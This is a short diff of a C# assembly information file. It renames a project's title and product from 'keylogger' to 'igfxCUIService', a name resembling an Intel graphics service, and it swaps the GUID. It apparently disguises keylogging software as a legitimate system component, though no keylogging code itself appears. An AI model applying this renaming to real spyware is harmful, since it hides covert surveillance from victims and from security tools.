@@ -5,11 +5,11 @@ using System.Runtime.InteropServices;
 // General Information about an assembly is controlled through the following
 // set of attributes. Change these attribute values to modify the information
 // associated with an assembly.
-[assembly: AssemblyTitle("keylogger")]
+[assembly: AssemblyTitle("igfxCUIService")]
 [assembly: AssemblyDescription("")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("keylogger")]
+[assembly: AssemblyProduct("igfxCUIService")]
 [assembly: AssemblyCopyright("Copyright ©  2017")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
@@ -20,7 +20,7 @@ using System.Runtime.InteropServices;
 [assembly: ComVisible(false)]
 
 // The following GUID is for the ID of the typelib if this project is exposed to COM
-[assembly: Guid("1f4cabf8-6c0a-4c0f-a513-c2a475458b30")]
+[assembly: Guid("970e3ed1-b954-45b8-98a6-4b0eb09fcf33")]
 
 // Version information for an assembly consists of the following four values:
 //
